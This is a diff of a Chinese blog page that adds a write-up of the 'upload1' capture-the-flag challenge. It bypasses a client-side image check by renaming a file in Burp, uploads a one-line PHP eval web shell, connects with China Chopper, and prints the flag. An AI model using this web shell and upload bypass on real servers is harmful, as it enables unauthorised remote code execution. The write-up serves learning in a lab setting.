@@ -468,7 +468,7 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    5.6k
+                    5.8k
                 </div>
                 
 
@@ -1025,6 +1025,20 @@ Can you anthenticate to this website?<span aria-hidden="true" class="line-number
 <blockquote>
 <p>php反序列化还是比较大的一块内容，看来要花一点时间学习一下啦</p>
 </blockquote>
+<h2 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h2><p><em>so easy</em></p>
+<p>访问网址发现可以上传图片</p>
+<p><img src="https://ae01.alicdn.com/kf/Heb6f72f316ff4ca19f3df436c66df7cfn.jpg" alt></p>
+<p>居然还返回了一个类似地址的信息 upload/1571474485.C罗.jpg</p>
+<p>尝试访问 <a href="http://111.198.29.45:44266/upload/1571474485.C%E7%BD%97.jpg，" target="_blank" rel="noopener">http://111.198.29.45:44266/upload/1571474485.C%E7%BD%97.jpg，</a> 居然可以，证明我们的文件的却是保存到了服务器上并且我们还可以直到在哪里。</p>
+<p>尝试上传一句话木马， 创建txt文件写入 <?php eval(@$_POST['a']); ?> 保存为a.php，尝试上传这个文件，结果显示让我们上传一张图片，即存在客户端检测，尝试绕过</p>
+<p>更改文件名为a.jpg，在此上传，使用burproject拦截，修改文件名为a.php</p>
+<p><img src="https://ae01.alicdn.com/kf/H66f9633928b04215974c7a99f9f471aaA.jpg" alt></p>
+<p>得到返回的信息，成功上传一句话木马</p>
+<p><img src="https://ae01.alicdn.com/kf/H6fe015d9370e4cceb28d97fb5c5dff03s.jpg" alt></p>
+<p>使用中国菜刀连接</p>
+<p><img src="https://ae01.alicdn.com/kf/H8a1f4b6034c74870a897916fb30fa9e81.jpg" alt></p>
+<p><img src="https://ae01.alicdn.com/kf/Hab6452bb90db4da98fca7d1dc0aad1fcJ.jpg" alt></p>
+<p>下载flag.php文件得到答案：cyberpeace{8bfda28e2f87c19cafc9380f62126c31}</p>
 
             </div>
             <hr />
@@ -1506,7 +1520,7 @@ Can you anthenticate to this website?<span aria-hidden="true" class="line-number
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">45.3k</span>
+            <span class="white-color">46.2k</span>
             
 
             <br>
